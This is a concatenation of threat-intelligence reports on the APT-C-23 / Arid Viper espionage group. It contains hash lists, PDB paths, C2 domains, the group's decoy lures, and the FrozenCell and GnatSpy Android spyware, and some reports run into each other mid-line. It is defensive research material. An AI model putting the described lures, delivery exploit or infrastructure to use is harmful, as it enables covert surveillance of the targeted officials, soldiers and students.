7b1a513520f18612c4cd2ac9e5e5a1d660274a77b8f190bd277339247b6a51ee
7d74e531dafdb6e645ac429c17aba3903e9c0f4fe7e4f93688d37eb638c52f48
722cfac01badf1106887fbc985060a2fb31eabf9943520bd24abf2fa208217b8
5a83a289c0c4c222bb190152bb8bc5f429e6799ac233ba99b7a860b8519872bc
50cb597f33f8252bd94c54927bd2e0259a732ad64fb8b413a205e1f290870445
c721b5d3abc978ea8608f23b9a9a6ba81afe87d6d6660bc6006ee1ba83491d06
16e43f8d2e439b5ce8e48b75bb25e90011f1ccbb41278fe15f7982a304a832de
5579cfef934b47519388719f0bf532bd4326d0221b6ab47c69ca098f3d2d2de3
7e476fb1089b95bfb08ec3ab3931ae31da9fd1f742928bab339d297b70b9fcc2
6279030f7e5eaeacd28232de35382c38614fefc90ef753f2492300c1150e54f0
e4f015b6cc0539fff746dc39229d25385d95e827204695b8b0003457cd206dab
ea6dffd2bb7c13eebdb605060b26ff2319f6f4ab81e9c41998351c039c177d5a
4546413de0c2df37c83a88808cebe265dc74dd87c550c378f1d23d8e5430a7db
a02bdf36048e6440c50782dbbbc8e0529e4ee480bf2be43dcad2d22f3b47bc08
5e82f68b6560c959975b9e8c20a82de71fedc8dc7277d2a16c9a13829c91dd22
30912cc80cf7defaec360cdd08952ceed493e88d87ad705ec80831581c5c867d
44d0c56f4037d21b85fe00e944456cf2a67e71ca3133c3afd0ea1f35d29e7b33
bdb17c29b31fbe557200569f584c589104b52f188799dc5b45a33f3a7a16a34d
c1ab9ec3f1d6050a77cc8d976dac441c13ba2fd3c0229076c20a2406258198bf
397087699aa240e8a74a687902ad3c8b2a0f1535179fab046673cc1032c72796
2088d5f31b8f8a75464def9b02c159a2a1aa3056fc3c82056272c9b39cea0639
bb3676b9ea838344e955cf58b01d2df4384f6ba8b62fa00259ab8c449e77f358
a2e979e03c32e5de9ba34407b37143b6a887ab6f9d8cdcb07a6276f41202dc5d
c24e30b7a32f096bad4385012a1c1b3a61198156b19081f7658a4f1c25d055c4
7be574a767acb4fe9a1af425fe1fddcda17a97f4653837384352cebec21801e1
54b07adba4b1fd4467a2cae45480ae8f764866e8ae6bf66150f2cd860b36aaf2
4550e8b216c2ef7d78be2ef572fefbdde76c0c6640c6c1cb6757a3867a9710d7
455be9cff65b2178189444572b0a9b31d5cc5b709bcefc7381eaf4b9141ca46f
81410d2a560984fe41d371bd745f6de9f9f120dc929f439947f3cfc330774a95
5329652e9eb2aa681abc8e69955b24165a23a807a69ae76e67c07d1fdfe8fc38
42e8118271ce2df0a3313e271d8a86f425bdcd15e1b5bd6c6239701cfad6da3f
8ee8572d912eca16470679fcd4d98e6e22e4446c2dd74d5d96f1056ce3a93e22
c5fc26f84955a041de20f3ff2ee04a59f9d8a2ab5d6c4702b8da0cf03b4147ef
e75d209025a34fda854cb9289c1f329671fe010ba6616e24c0338eb9f17266c9
2c0ba35cdc0ef302fc52aef368565b61edbf9c7a962661cafa4b2cfc26eda371
1c1d858934f278abac6bce5f609db8649d58ceaada00f661b6e18b0dd13946b0
31a4d2f12b5e8ab7ca06a61dc117cc5742ea222e3101e495b60f4c289f14b547
7f11e0bbc892a97b7c42416c43fe178ebb240939d9dee70c3c598305ce8a2d4f
c9ffb81a97a9458f1fc96f35cd187b1d7311479e77d031586abdc3d426da0859
a136bc03de8cf0b99b8aa500460a8be6aa1c98ce78515c217ad03d6faa9e08f1
874febea579812e0fbbc3dc1e591264108e61864c48f9b8e15fc9644edee0621
f7bd43323917ce3ce71da472593e0899dd54ce957e2621083a29680a04a263e8
5ba356e5e96ce8b9cbccdcb11d817bb53924afdb7e3af72155898fc7bfae0920
MICROPSIA
453b9f7aed67f41ec192db3011459e2dd865bb729265c544ee1b8814c6e7dc53
c9e55094b84a06b3a40b7df1cd76fc287fdc02a2cdd30af359743bbc23475917
a627d2bff74ce07a619cc8fd36294f66eab94b92d41e50b06e63d736ffafd254
f70681c7e8ab419fd0938802a823337abad936cccc0ace9ee232f2b874e561f1
e3963ee9bf892d3f3eea0620585e2e773a30cf536c73a01dd51d6ce36f4daf5d
e2ac3cf79e7267d2e088c3a269aa84fc71fc6073019abb94d16a024d3ad16f3e
b08b96eb46b65af20688c3910a8edcc7dd072a5149ca4b541183acfa81220b97
cdada29d7cd7d88a49a4475a50ee0401d11e2d9a61c4396a60ab0a2fb3da0d01
ca438526ad398f240d3ba551cdd59ada402a6270755c4b0750bc0b120e058320
2fc2263416b3b55e1dfe67ab6435eed00a74a82e3fbdfdbb6a3a102a7f404641
15c9dc07d2858f496ea7f4110a13e58e6828fe836704582dbbdc630df18d3de5
579cf5f112c5b542f7240e200fec6312983255b497c6f0a65f2fe2d3b78391c5
15e3cd8a698d30ac7851b3232f8b7cbc7fbbb821c9eece34ef327b67dc281883
1e5739d640e24504a5e03d0847ad720622c64d0effcd2e1b80528a055049ca82
8f1ff9588630c3bc017468ff0eadb69c65cf77aae47a148e132eb4b48ae5c988
eb5e920dd1e2b2df4cede82d0efbda1556fa35ac1c4589533fca58832fd07a62
2fac7aab5c3b922b883941fa67fdd7c197e6aaef429e723dccb3fc2150083c8d
368845729255ab7fcfb5c0b6c153929d5ccb8d1f9a40cc02ca7c026b4b6813ec
41b3e90442c97e40abdf29d8b7ecedea1026a1fb4dbd6d6cc410d3f3463cb205
b284c718d5b6c30eea2a0df34d9d75d3a22baa776b8d6f75b579da5549529f43
74a94b549fd52e8c23c1fca23a80262a50ae8e08ae56adf9e94c54acf2b313bf
39aa9cc3747a7fc9c80a04ef47107950c1946386525d79fe97b0bfb593e4bdc2
6c3bcef39b3892b5c3ed5602624ca5ee244cca7bf86aebe293bbd11eaf57834f
c4e79e151986dc5e16ce763321de90d8c214909df7210ec05e590c4375423a76
5bab8a360d1d08e37e4e6c052f7fce13a291ad9b99f950770a647222bfc4d6b4
accf87a349b0cfe6403e827089d7a97a8a9bf94dc4535d9ce2e54ecf9bc699fa
4f1be1f1c28dfc337a37cf22611aa288565c294910083524be4a317306b5490c
6e461a8430f251db38e8911dbacd1e72bce47a89c28956115b702d13ae2b8e3b
7dd7cc9e90b074ecc3d8f5540864e105fc0cc034a18a0681bd0ab14252bd0387
023cee622d8ddd7afd7603c1ba13447931508140cfe0dfd85bf4adc5b0d2cf8e
63d9a5ef92a18dc7238bcc59330b41149cec4ef7602b18c0b99abdae83c0114c
adbb67b004131990598009162a195b04107231a79de25945de94d2978f96dcd5
39e4e3637e651d2d8251c0f891dc4b0f0494c9bada2da930761d3fe6cc6ebaae
6aeebb3cdb2ca9b325e042e76d195a5ac958b119baa559532c22d344f1491a30
fb95a719c4b26bb577cea5837cac6ba9fdfcfd240bc2fc7b1d0759bf392d5191
dd185667015d23438a994adc9e9b30572a1e7479c05f563e0b6c71b8c6023685
2cbafd6a0461e7ae1929897a8039ce5f198b76281465c49b4547abf9a139dd89
b6f8b5ba026af863e878eded79f40e5efa1dd7ce725cd0479e5f062dbf4fdd4f
cfbe077d7a4807203c889292668695e114ed9524a11a00b0d670a2f4da74a27c
d8d87ac1e004de113a5a394b757f612bcde22eaaab574e53d4b1909193b77b7f
6eea4d800b3af9363abcea6f5051039c2fe7bec3e690500077f022204588db6f
2b644917074452c385e4a960d9ef504ce22733047dc282ef31ba7c012041e58c
499569d014d6b05e2187b8aa5966e4b56133cd67ff7a110c259cda5299cdd4b9
0edc4424c8eeb9708b6b8bc74806b6c17c9cfbb49e2688f711092381823fc733
a9ad6b278cabc7c9ac063c37b0656cd924639a227977ff250339479d5aa0863a
e477b5e00699a9ccb3868de543c29087042fd44c631f8fcda5faaf7922382146
114ef36f968912ef885d06e3d092dad739f9b6afe2f246e52fb3ba5e6bf8ee00
85d2d2293364c90d51fba7696a44908e0fae50dae1337e59441692e91c25c9d1
7efaff81e5be73608bccad93185f6b559597d2819bb33c95436d9246ef602f49
2e225c32dc320ab2441274fc7acf6fe52bd9621314c27e806fa8c4bec409b5e3
8f3e3b93eddb3f1fecc75d46e9ea5eb5d2ba3283c1e040ca12cb7530b7eb2455
75329e7b79284f63c1383244b20fb0d9c4bb1e9c4feba04307f1223db30c9203
04f6422325cf3fbe35879cb6532745d3a3b555144ef7b4e88ed96bf3fe4e70ac
fb64d608573ba1b1fd4254e7a1c7b3ffa1dfdc678300cc5d16eb4a88cf7592e3
a2cad08db8e151a90857df70d9e9c5e605aac6fa0e6e5d5ad150c96027743612
b5846554ee1ef9de0a8d83527f609abf5b328d104056b7a763ed89e75152ddbf
cf9287ded9b5a6543afc66ca60c4d20e6f7e4c318e8f303567d781eb98e4168c
def8065164959595de2ff6b35141985e7fd7a6c836db0b7a3f389b022c7f3650
3a4498a6e4213a680dd2e57516637f7480c0bd7a342ec24788fdb9694b0d1150
6c21e4331ec2d02e427025efeb6fbaf8c779513027720d24365283d5166add77
e05a329bbfe8cc0f7f3e2296fe0bdf86b6d4df70a8242409feb6c846db0b221c
559e6970861563f815e097a7a152970508323666c511afbc8165c4869256f692
54e5f4ecd18c6a18a6f25be6b7a392cbbd5bc107b868d8a078bf3e3fa701e453
e0b2671b1ba7ac123b6ec3e152711691e8690839b8e04fbb748d2fa8a4f5e982
1adbad10e5193b7533bccbae9bfa660f29162730fd4bd89c332bf8ae5b96ae78
e8ab81ee03aca399d8e4e3f6ca9d6e98c7c75e68f22e12d6213c15d8b9cc3ace
425d427828205811258e22cd04eb9acb4e497590eecefed77cdb9252b3e45fcb
876919233b24808b457fe83c815a4e6b30e415771bb6fe2e68a5cdae8e9a6c6c
6b676728f3206db8aa7ae57d8ee0747f2919a64ab8157b28bd1add0c15d2bb59
76573e0c213dbdba3283887eee7418f2b0c0ce6506145567547319bec8f0d6a6
d1bbde1ddd5bb1b421f230ba2213013b098f2abe3ac526be142371e2728ba40f
9a32cc01c4e6120cec03aba783087df35724d5b1feb3f75fa0b78963e8cc7735
699f4f0513de49db7dafa3760daa3c27ca9cd12e216ff3e042966212870bb906
1a4d7b935cb365f75a3f33c6490023aad054facf55a1411cd7b9d723eb99cf53
14b34347a75bc46ee69e1782cb658f7f404487a8fc40b973649d53d008bc0e75
8cf8d06d2935153d3c8d570ecd5990432bb4933ca89845bc2cd763b40ba7edb4
a5daa9cf58a2f6bf3f39ae022b0c87458b3ade2d4a006e5489f2417ff639e011
582cd41417aeb2f3f86d2c9fb7f8add4e5edacfed7cae0aecc8cb088a823d240
0d94f4aaebcdcfaf5b377af33da42e69b453297cf6b90387db95868a48c172bc
2f40c95693d1c0b0aa8195a7b943b935634745a1aae3ea91752ca4a535e69007
7f02e8bece61a3fa6400e9dcbb0972a136b1818bf1629afe4456819beb04b4cf
77dc371fcdcaae8f38e942e9084855d62f2daf81460c33f2ea64c77a470f8c8c
06a69598b2251200cbdf51c53be45ad90240fd69502063aa4afa5b1086fc34b3
e73381e591dd8538641236530bda5bc0daa014e3486b11a4da820657b48db9f9
027b0d9ee5258bb18c824be1b6aff33aeb3060ca3e577f2f8fff06ed4854883d
7d4e98f9136c4c7952e3acbb328ad06e522718ad4d05bcd04eeb225335e75631
b033de3c20701482bd375ea6e45ecae38295de72336a5f96f4ab994e6cef212a
b22b98b8d50aab1b0bea0e458e0736940215365752797de892745bafda5d9ce9
75a708bf42ac01d857ecb3bff18c633e334329d4b89ae4201a989f564a2410b6
b679878e940eaee79436a895aa4f43e32416c3ad2fbfeb812fc39022c84b82d9
3fce85b9c279d94dd7018a656027a496b4b5df719933630d7375c42ac088dd87
d63da6f863609c87cf283cd6da7c325f9622bff986b05c47e106855a514da4b6
0e7507e955dfe8027ed5740400dda772c403510f75d066baf0077ca1ab478048
Appendix C – Associated Android Malware Samples
d909669b000c479b8bdd9f86fa62879a7c8b4dca8cde4f4a404862a4604c52e2
b6abeffe986eb38e411a4fe956280e2028d8bef699d9dd3244bde721a99b1dee
c1564c56c46146db36ec97afd994c45f3621f39c82cc692adba5b9f6d9a62897
c20438ba8c9e008c1e2eb4343f177757fc260437aeac52df61b156671b07ac14
5f3b4eddcc72598721b9ca395d1e5881acbd4fc562e09b688b2d42f65d3a4a93
544a1c303ef021f0d54e62a6147c7ae9cd0c84265e302f6da5ed08b616e45b78
522ae87e792fd0b2021af0edcdad283505d6258316783c489f37234231b9d6bf
22078e0d00d6a0f0441b3777e6a418170e3a9e4cce8141f0da8af044fdc1e266
58e70e498397acae9b5e84a153e27578ee25e0ee0aca16bcf8a1746423f210f6
e23d689fff3907cbc6f495d1ebaa9c4cdf6f93f9fd26b790f60680dedf489618
02e1692dbc95bffe12083786208a966bf6b184a428378aabebbd3fee501021c5
758dc6aff09885abf9a6503e4a6473bca83c878f6131acf41290a3c8a5df7cdb
f67356c2bcd99009f1d68806a1214b4108771926e423908d8997cd881277e76e
d066c1c5eccfcf64e8398a49ac7efacc9d70a8c8544fb71ba22e0e2f77bff543
16b4d65abf95cfb3cedd39b217ff0e4ee2229ae32aeda5170f34c5a3b9c5a0f3
43f2e20933638594c02c83e85bc058b46c308b4f851477e2c0a2a92b4fb1168b
2a28c199eeb622fedc9b0b16f65f9a2da113dddd264966a76654546ce70804a4
53ca656dd54c14b14ddc758e2160443e1d5d761ffecb37e15216da67fc94c468
B2036d2b31c75684527a8850182363fefbe436dd8f5ccb5e792df2a8535981bf
Appendix D – Observed PDB Strings
C:\Users\USA\Documents\Visual Studio 2008\Projects\New folder (2)\kasper\Release\kasper.pdb
C:\Users\Yousef\Desktop\MergeFiles\Loader v0\Loader\obj\Release\Loader.pdb
c:\Users\USA\Documents\Visual Studio 2008\Projects\New folder (2)\s7 - Copy - Copy 19-2-17\Release\s7.pdb
c:\Users\USA\Documents\Visual Studio 2008\Projects\New folder (2)\s7\Release\s7.pdb
C:\Users\Progress\Desktop\Loader v0\Loader\obj\Release\Loader.pdb
D:\Merge\Debug\testproj.pdb
c:\Users\USA\Documents\Visual Studio 2008\Projects\New folder (2)\kasper - Copy - 21-2-17\Release\kasper.pdb
C:\Users\Yousef\Desktop\MergeFiles\merge photos\Loader v0\Loader\obj\Release\Loader.pdb
C:\Users\Yousef\Desktop\Loader v0\Loader\obj\Release\Loader.pdb
Most Read Articles
Russia’s Trident Ursa (aka Gamaredon APT) Cyber Conflict Operations Unwavering Since Invasion of Ukraine
Russia’s Trident Ursa (aka Gamaredon APT) Cyber Conflict Operations Unwavering Since Invasion of Ukraine
Palo Alto
Networks!
Sign up to receive the latest news, cyber threat intelligence and research from us
By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement .Foreword
This post will provide an analysis of a coordinated malware campaign of targeted attacks being carried out by an organized group of threat actors. These attacks are being aimed at targets primarily located in Israel, Gaza, and Egypt. They originate from this same exact geographical location in the Middle East as well, with a high probability of at least some of the activity coming from the Gaza Strip. The threat actors in this campaign are primarily focused on targeting Military and Government institutions as well as military personnel, activists and other official institutions such as academic institutions and media.
Using malware targeting Android and Windows machines, this group aims at spreading Trojan surveillanceware and achieving intelligence gathering capabilities from its victims’ machines.
Until recently – some of this group’s activity has been labeled as “Arid Viper” by Trend Micro , and “Desert Falcons” by Kaspersky .
On March of 2017, the Chinese information security company – Qihoo 360 , looked into some of this past malware activity and its common forensic artifacts dating back to 2016, and designated the group as an APT (Advanced Persistent Threat); calling it APT-C-23 with the nickname “Double Tailed Scorpion” effectively tying together different sets of this past malware activity into one single main attack group.
I aim to look beyond the time period covered in these reports and go over the most recent KASPERAGENT malware campaign, investigating the command infrastructure used and tie its activity together. Hopefully, providing a possible link of further and newer activity partaken by this group not looked into as a whole until now.
Tactics, Techniques, and Procedures
With its malware activity pointing to begin with around the year 2013, this group relies heavily on social engineering with the use of file decoys, spear-phishing and impersonation through sockpuppet accounts on social media. The threat actors are not shy and actively engage with their carefully selected targets on mediums such as Facebook messenger, communicating with their victims and trying to get them to download their malware.
The earlier activity seen by this group used fake Facebook accounts trying to build rapport with their victims using common likes/pages and sending malicious links or attachments via text messages. The later attacks using this sockpuppet tactic switched to luring potential victims by impersonating the interest of attractive females towards their target.
Advertisements
Report this ad In their other objectives, they rely on spear-phishing emails with selected political and geographical themes as attempts of deception and decoy.
The group uses C2 infrastructure on selected hosts and domains with a majority of them pointing to registration by specific individuals.
ViperRAT
ViperRAT is a campaign that has been active at least since 2016, with the most recent spike in its activity occurring in March of this year. Targeting mobile phone users, the threat actors impersonated female Facebook members looking to chat and meet with IDF soldiers via direct text messages. Using this social engineering tactic, the victims were tricked into downloading malicious APK files of infected mobile applications.
Attributed to Hamas by the media , this campaign selectively targeted members of the IDF serving in its southern command near the border with Gaza. With the aim of deploying a RAT (Remote Access Trojan) on the victim’s device, the group seemed interested in exfiltrating all media, documents, device location and take further commands once infected.
As reported by Kaspersky in their technical analysis of the APK file, ViperRAT uses the following domains for its malware C2 infrastructure to receive commands:
androidbak[.]com
droidback[.]com
endpointup[.]com
siteanalysto[.]com
goodydaddy[.]com
Which was an interesting find for me, as it raised my curiosity regarding their history and how they connect to the other campaigns and their command infrastructure.
My immediate investigation into this resulted in finding out that endpointup[.]com and androidbak[.]com were both registered by the same registrant organization with different admins from Gaza, Palestine but the same parent organization.
This is certainly fitting with the narrative of the campaign and media reports, as this piece of information coincides with the campaign’s traits.
While the use of this Gaza IT company doesn’t mean it’s an active and willing participant of this malicious campaign, as this could be done without them knowing it. Pivoting these registration details uncovered some additional finds pointing to older malware activity and a connection to another campaign.
This company (Palgoal[.]ps) and registrant was used to also register:
androidmobgate[.]com
droidcart[.]com
advflameco[.]com
fastdroidmob[.]com
treestower[.]com
stikerscloud[.]com
dooownloads[.]com
7qlp[.]com
With 7qlp[.]com containing minor past phishing activity:
The interesting find when I looked into these domains – was dooownloads[.]com pointing to some artifacts dating back to 2015 as a C2 domain for some significant malware activity:
MD5 – 821693d75a2c5453ddf0090e6af1f34b
This piece of malware was a dropper for a Trojan backdoor looking to extract its victims machine data and information.
https://www.virustotal.com/en/file/dee4f355e1c512118a3246afceb7424ea17f372af558a8908d7ab6f2406111f6/analysis/
The second domain coded in that malware’s sample C2 servers was:
audioodrivers[.]com
It can be seen as part of another campaign targeting Israel specifically with a malicious mp4 decoy
Searching for the PHP control panel path found on audioodrivers[.]com leads us to discover another more significant piece of malware correlated to this activity by using the same malware with a different C2 domain.
Its C2 is pointed at oowdesign[.]com — This domain was part of older malware activity by this group dating back to 2015. As can be seen in this report by Proofpoint, which actually correlates it to Arid Viper with this exact domain indicator, similar malware techniques, and a correct assessment as the campaign is still active and under the radar 2 years after their report.
https://www.proofpoint.com/us/threat-insight/post/Operation-Arid-Viper-Slithers-Back-Into-View
In summary, this update to Operation Arid Viper demonstrates that despite its relatively low profile since February the Arid Viper / Desert Falcons threat still has teeth and remains a risk for organizations in Israel and elsewhere. While the overall attack profile observed in recent examples remains similar to the originally documented campaigns, the recent campaigns exhibit several important updates:
1. Use of links instead of attachments
2. New lures: still using pornographic video but most recent detections also included lures for auto accident footage
3. New executable name: originally reported using “skype.exe” (and variations on “skype”), the recent samples used “ chrome.exe ”
4. New C2 domains
5. Added encryption for exfiltrated data
The return of Operation Arid Viper shows that targeted attacks can remain a threat even – and especially – when they are no longer in the headlines,
Observed C2 domains and IP addresses:
smilydesign [.] com / 195.154.252.2
yalladesign [.] net / 173.236.89.19
oowdesign [.] com / 195.154.133.228
coldydesign [.] com / 195.154.252.2
KASPERAGENT
KASPERAGENT was discovered by Palo Alto Networks earlier this year and was dubbed as such because of the strings it contained in the malware. They claim to have started monitoring this threat in 2016.
KASPERAGENT is a spear-phishing campaign with the use of direct links and email attachments. This malware targets Microsoft Windows machines, and the campaign began with using fake news websites and news stories as its lure for victims. This campaign targets more Arabic speaking targets than others, and the malicious files used were usually archived attachments of the RAR extension.
In April of this year, KASPERAGENT struck again this time targeting people with an interest in issues in Gaza, its security forces and the power struggle with Fatah.
This campaign was launched at the time period of the May Palestinian Authority elections. Using decoy Office documents, the threat actors try and lure potential targets. Upon execution the malware drops its payload and contacts its command infrastructure for command and control.
One of the decoy documents used.
English translation:
Date: 2017/04/23
Very Very Secret
Brother Yahya Al-Senwar (Abu Ibrahim), God keep and protect you.
Peace be upon you and the mercy of God and his blessings.
Subject: Concerning the declaration of Fatah as a banned organization in the Gaza Strip
Beginning with wishing the best for you, and we ask God that you receive this, our writing, in full health and well-being, this follows:
* We are inform you that we are prepared to implement the decision immediately once announced.
* The Fatah headquarters and the houses of some the activists that were used to manage movement activities, which will be closed immediately upon issuing the decision, have been restricted.
* The leaders and actors which will be arrested immediately upon issuing the decision have been restricted.
Please accept our great appreciation and respect,
Brigadier General Sami Odeh
Director General, Internal Security Agency
The C2 domains as reported by ThreatConnect in their report:
windowsnewupdates[.]com
treestower[.]com
Remember audioodrivers[.]com from the 2015 Arid Viper campaign we discovered? Well – Another piece connecting to this same group is the registration of audioodrivers[.]com by an IT company located in Gaza.
This time a company called Nepras. Looking at the domain registration history – Nepras was also used as the registrant of mailsinfo[.]net, which coincidentally was hosted on the same server as audioodrivers[.]com.
The server used happens to also be a part of the now much newer and supposedly unrelated KASPERAGENT campaign, which was just discovered in the beginning of this year by Palo Alto.
Leading us to seemingly possess a connection between a campaign dating back to 2015 targeting Israeli users with malicious file decoys, infected mobile applications, and to a malware campaign dating to 2016/2017 targeting multiple nations with the majority of them being Arabic speaking.
If we take a look back at the original IT company we started investigating – Palgoal[.]ps, We can see it also was used to register the following domains:
stikerscloud[.]com
treestower[.]com
These domains happen to be the same domains used as C2 for the KASPERAGENT May Elections malware activity, as reported by ThreatConnect in their report of the KASPERAGENT malware a whole 2 years later.
A graph illustration of the connections of the Palgoal[.]ps registrant with all its discovered domains.
All this leads us to realize that the same infrastructure was used as the command and control for previously unrelated malware activity from different time periods. Activity which can be connected by the very similar if not identical C2 servers and/or domain registration information; pointing to a potential connection of the threat actors.
Recent Activity
Most recently, Eyal Sela from ClearSky Security tweeted about the latest activity by this group testing out new document exploit methods utilizing the relatively silent Rich Text Format Microsoft Office exploit CVE-2017-0199, giving the attacker remote code execution once opening the document and this time a C2 registered in Panama.
Arid Viper testing new delivery mechanisms, 0199+Pastebin. C2: accountforuser.website and 213.184.123.144 cba21056f20153af7d25792c81c90d6e pic.twitter.com/f9JU4qksAN
— Eyal Sela (@eyalsela) July 5, 2017
Conclusions
These malware campaigns may seem separate at first, however, they are closely linked by their artifacts and infrastructure dating back to 2015. This could be a large group of attackers sharing infrastructure, or a separate set of smaller groups overlapping somehow.
It can be at least said there is a certain connection to the Gaza strip and Palestinian territories; both by their earlier target selection of Israeli targets and their interest/knowledge of the power struggle of the Palestinian Authority. The use of infrastructure located in Gaza points to some of the culprits being located there at sometime in the long operation of this malware campaign. The possibility of a larger Arab speaking group orchestrating this remains, as well.
This campaign relies on heavy use of well used social engineering, a sophistication acquired by time and well picked attacks/targets. It’s also an active campaign not looking to go away anytime soon.
References
https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/operation-arid-viper-bypassing-the-iron-dome
https://securelist.com/the-desert-falcons-targeted-attacks/68817/
http://zhuiri.360.cn/report/index.php/2017/03/09/twotailedscorpion/
http://www.bbc.com/news/world-middle-east-38594669
https://www.proofpoint.com/us/threat-insight/post/Operation-Arid-Viper-Slithers-Back-Into-View
https://researchcenter.paloaltonetworks.com/2017/04/unit42-targeted-attacks-middle-east-using-kasperagent-micropsia/
https://www.threatconnect.com/blog/kasperagent-malware-campaign/FrozenCell has been seen masquerading as various well known social media and chat applications as well as an app likely only used by Palestinian or Jordanian students sitting their 2016 general exams.
Lookout researchers have discovered a new mobile surveillanceware family, FrozenCell. The threat is likely targeting employees of various Palestinian government agencies, security services, Palestinian students, and those affiliated with the Fatah political party.
FrozenCell is the mobile component of a multi-platform attack we've seen a threat actor known as " Two-tailed Scorpion/APT-C-23 ," use to spy on victims through compromised mobile devices and desktops. The desktop components of this attack, previously discovered by Palo Alto Network , are known as KasperAgent and Micropsia. We discovered 561MB of exfiltrated data from 24 compromised Android devices while investigating this threat. More data is appearing daily, leading us to believe the actors are still highly active. We are continuing to watch it closely.
This threat is another proof point that attackers are clearly incorporating the mobile device into their surveillance campaigns as a primary attack vector. Government agencies and enterprises should look at this threat as an example of the kind of spying that is now possible given how ubiquitous mobile devices are in the workplace. Attackers are keenly aware of the information they can derive from these devices and are using multi-stage (phishing + an executable), multi-platform (Android + desktop) attacks to accomplish their spying.
All Lookout customers are protected from this threat.
What it does
FrozenCell masquerades as fake updates to chat applications like Facebook, WhatsApp, Messenger, LINE, and LoveChat. We also detected it in apps targeted toward specific Middle Eastern demographics. For example, the actors behind FrozenCell used a spoofed app called Tawjihi 2016, which Jordanian or Palestinian students would ordinarily use during their general secondary examination.
Once installed on a device FrozenCell is capable of:
Recording calls
Retrieving generic phone metadata (e.g., cell location, mobile country code, mobile network code)
Geolocating a device
Extracting SMS messages
Retrieving a victim's accounts
Exfiltrating images
Downloading and installing additional applications
Searching for and exfiltrating pdf, doc, docx, ppt, pptx, xls, and xlsx file types
Retrieving contacts
The graph below represents a split of the types of data from only one misconfigured command and control server (out of over 37 servers). This is only a small picture of the threat actor's operations.
Some noteworthy files identified in content taken from compromised devices include passport photos, audio recordings of calls, other images, and a PDF document with data on 484 individuals. The PDF lists dates of birth, gender, passport numbers, and names.
Potential targets
The actors behind FrozenCell used an online service that geolocates mobile devices based on nearby cell towers to track targets. This data shows a distinct concentration of infected devices beaconing from Gaza, Palestine.
Early samples of FrozenCell used an online service for storing geolocation information of infected devices. Analysis of this telemetry shows infected devices are completely based in Gaza, Palestine. It has not been confirmed whether these are from test devices or the devices of victims.
We were also able to link the FrozenCell's Android infrastructure to numerous desktop samples that are part of the larger multi-platform attack. It appears the attackers sent malicious executables though phishing campaigns impersonating individuals associated with the Palestinian Security Services, the General Directorate of Civil Defence - Ministry of the Interior, and the 7th Fateh Conference of the Palestinian National Liberation Front (held in late 2016). The titles and contents of these files suggest that the actor targeted individuals affiliated with these government agencies and the Fatah political party.
Some malicious files associated with these samples were titled the following:
Council_of_ministres_decision
Minutes of the Geneva Meeting on Troops (محضر اجتماع جنيف الخاص بقوات ا_من)
Summary of today's meetings.doc.exe (ملخص إجتماعات اليوم)
The most important points of meeting the memory of the late President Abu Omar may Allah have mercy on him - Paper No. 1 (أهم نقاط إجتماع ذكرى الرئيس الراحل أبوعمار رحمه الله - ورقة رقم)
Fadi Alsalamin scandal with an Israeli officer - exclusive - watched before the deletion - Fadi Elsalameen (فضيحة فادي السلامين مع ضابط إسرائيلي- حصري-شاهد وقبل الحذف-Fadi Elsalameen)
The details of the assassination of President Arafat_06-12-2016_docx
Quds.rar
Screenshots of some of the PDF contents:
Many of these executables are associated with various short links created using Bit.ly, a URL shortening service. After analyzing the traffic associated with these short links, we determined that each one was associated with a referral path from mail.mosa.pna.ps. MOSA is the Palestinian Directorate of Social Development whose mandate is to achieve comprehensive development, social security, and economic growth for Palestinian families, according to publicly available information on this ministry.
Infrastructure
At the time of writing the following domains have either been used by this family or are currently active. We expect this list to grow given that this actor has changed its infrastructure numerous times in 2017.
OpSec fails and use of cryptography
While looking at this infrastructure, we identified that one of these domains has directory indexing enabled. This mistake in operational security allowed us to gain visibility into exfiltrated content for a number of devices. Continued mirroring suggests it is likely a regularly cleaned staging server. We sourced the over 561MB of exfiltrated data from this domain alone, all of which we found to be 7z compressed and password protected.
Password generation for compressed files takes place client-side with each device using a unique key in most scenarios. Key information consists of an MD5 hash of the device's Android ID, the device manufacturer, and the device model with each separated by an underscore. Visually, this can be represented as follows:
When combined with our analysis of indexed directories on C2 infrastructure, we were able to easily automate the generation of the password used by each device and, in turn, successfully decompress all exfiltrated content from compromised devices.
While exfiltrated content is encrypted, information used to generate the password is plainly visible in the top level directories for each device. Taking this information from directory listings, like the one shown above, allowed for the decryption of all content. In this case, FrozenCell has primarily netted the actors behind it with recorded outbound calls followed closely by images and recorded incoming calls.
FrozenCell is part of a very successful, multi-platform surveillance campaign. Attackers are growing smarter, targeting individuals through the devices and the services they use most. Government agencies and enterprises should plan to be hit from all angles - cloud services, mobile devices, laptops - in order to build comprehensive security strategies that work.
Want to learn more about how Lookout can protect you from app threats and other risks on mobile devices? Sign up for our newsletter to get the latest or contact us to learn about our threat intelligence services and mobile endpoint security.
Indicators of Compromise (mobile)How will the world of cybersecurity evolve by 2030?
Let’s take a look at what the future holds.
Cyber Threats
New GnatSpy Mobile Malware Family Discovered
We came across a new mobile malware family which we have called GnatSpy. We believe that this is a new variant of VAMP, indicating that the threat actors behind APT-C-23 are still active.
By: Ecular Xu, Grey Guo
December 18, 2017
Read time: 4 min ( 1122 words)
Earlier this year researchers first disclosed a targeted attack campaign targeting various sectors in the Middle East. This threat actor was called Two-tailed Scorpion/APT-C-23. Later on, a mobile component called VAMP was found, with a new variant (dubbed FrozenCell ) discovered in October. (We detect these malicious apps as ANDROIDOS_STEALERC32).
VAMP targeted various types of data from the phones of victims: images, text messages, contacts, and call history, among others. Dozens of command-and-control (C&C) domains and samples were found, which were soon disabled or detected.
Recently, Trend Micro researchers came across a new mobile malware family which we have called GnatSpy. We believe that this is a new variant of VAMP, indicating that the threat actors behind APT-C-23 are still active and continuously improving their product. Some C&C domains from VAMP were reused in newer GnatSpy variants, indicating that these attacks are connected. We detect this new family as ANDROIDOS_GNATSPY.
We do not know for sure how these files were distributed to users. It is possible that threat actors sent them directly for users to download and install on their devices. They had names like “Android Setting” or “Facebook Update” to make users believe they were legitimate. We have not detected significant numbers of these apps in the wild, indicating their use is probably limited to specific targeted groups or individuals.
New capabilities of GnatSpy
The capabilities of GnatSpy are similar to early versions of VAMP. However, there have been some changes in its behavior that highlight the increasing sophistication of this particular threat actor.
App structure organization – expanded and improved
The structure of the new GnatSpy variants is very different from previous variants. More receivers and services have been added, making this malware more capable and modular. We believe this indicates that GnatSpy was designed by someone with more knowledge in good software design practices compared to previous authors.
